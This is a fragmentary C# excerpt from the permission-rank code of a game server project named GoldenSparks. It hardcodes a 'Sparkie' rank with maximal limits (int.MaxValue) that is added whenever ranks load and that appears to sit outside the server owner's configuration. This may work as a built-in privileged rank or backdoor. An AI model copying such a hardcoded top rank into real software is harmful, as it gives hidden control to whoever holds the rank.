...
namespace GoldenSparks 
{
    ...
    public sealed class Group
    {
        ...
        public static Group Find(LevelPermission perm) {
            if (perm == LevelPermission.Sparkie) return GoldenRank;
        ...
        public static void LoadAll() {
            ...
            if (File.Exists(Paths.RankPropsFile)) {
                ...
                Add(LevelPermission.Sparkie, int.MaxValue, int.MaxValue, "&6S&ep&6a&er&6k&ei&6e", "&6", int.MaxValue, int.MaxValue );
        ...
        static void AddGroup(Group temp) {
            ...
            if (name.CaselessEq("op") || name.CaselessEq("Sparks")) {
